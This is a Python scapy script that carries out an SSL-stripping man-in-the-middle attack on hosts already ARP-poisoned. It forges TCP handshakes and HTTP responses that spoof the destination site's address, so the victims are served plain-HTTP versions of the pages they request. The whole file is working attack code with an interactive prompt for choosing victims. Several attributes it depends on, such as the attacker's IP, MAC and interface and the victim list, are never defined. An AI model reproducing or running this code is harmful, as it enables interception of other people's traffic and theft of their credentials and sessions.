from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
import threading
from Tkinter import*
import sys
import os
import time
import requests
import netifaces
from math import log



class sslstrip():
	def __init__(self):
		self.ssl_strip = False
		self.sslVictims = []
		self.sslattack()
	
	#Filters out TCP packets that were meant for a poisoned target
	def sniff_filter(self, pkt):
		#Obtain TCP packets intercepted by us
		if(self.ssl_strip):
			return IP in pkt and pkt[IP].dst !=self.ATTACKER_IP and pkt[Ether].dst == self.ATTACKER_MAC and (DNS in pkt or pkt[IP].src not in [vict["IP"] for vict in self.sslVictims])
		else:
			return IP in pkt and pkt[IP].dst != self.ATTACKER_IP and pkt[Ether].dst == self.ATTACKER_MAC

	def getsslVictims(self):
		# self.sslVictims = [{ "IP": "10.0.2.4", "MAC": self.get_mac("10.0.2.4")}]
		# return

		print("The following victims are arpPoisoned: ")
		for i, vict in enumerate(self.arpVictims):
			print(str(i) + ") " + str(vict['IP']))
		ips = input("Please enumerate the hosts for which you want to strip the SSL: ")

		for vic in ips.split(","):
			self.sslVictims.append(self.arpVictims[int(vic)])

	def sslattack(self):
		choice = input("Do you want to perform an SSL stripping attack?[Y/N]\n")
		if(choice == "Y" or choice == "y"):
			self.ssl_strip = True
			self.getsslVictims()

			sll_thread = threading.Thread(target=self.sslstrip)
			sll_thread.setDaemon(True)
			sll_thread.start()

	def ssl_filter(self, pkt):
		return TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.sslVictims])

	def sslstrip(self):
		print("Starting ssl stripping...")
		def sendRequest(pkt):
			if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
				if(pkt[HTTP][HTTPRequest].Method == b"GET"):
					print("Getting response from", "http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
					resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
					return resp
		def sslStrip(packet):
			print("Start connection")
			victIp = packet[IP].src
			siteIp = packet[IP].dst
			syn_ack = IP(dst=victIp,  src = siteIp) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
			ack = sr1(syn_ack)

			http_pkt = sniff(filter = "port 80", count = 1)[0]
			ack = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt.sport, sport=http_pkt[TCP].dport,
														 seq=1, ack= http_pkt[TCP].seq + len(http_pkt[TCP].payload),
														 flags='A')
			send(ack)
			if(HTTP in http_pkt):
				resp = sendRequest(http_pkt)
				load = resp.text
				
				response = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
														 seq=ack[TCP].seq, ack= ack[TCP].ack,
														 flags='A') /HTTP()/HTTPResponse(
															Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,
															Date = resp.headers['Date'] if 'Date' in resp.headers else None,
															Connection = 'keep-alive'
														)/load

				response_payload = response[TCP].payload.do_build()

				base_seq = response[TCP].seq
				offset = 0
				for i in range(0, len(response_payload), 1500):
					re = IP(dst=victIp, src =siteIp ) / TCP(dport=http_pkt[TCP].sport, sport=http_pkt[TCP].dport,
														 seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
					offset += len(response_payload[i:i+1500])
					send(re, iface=self.NETWORK_INTERFACE)

		sniff(lfilter=self.ssl_filter, prn=sslStrip, iface=self.NETWORK_INTERFACE)





attack = sslstrip()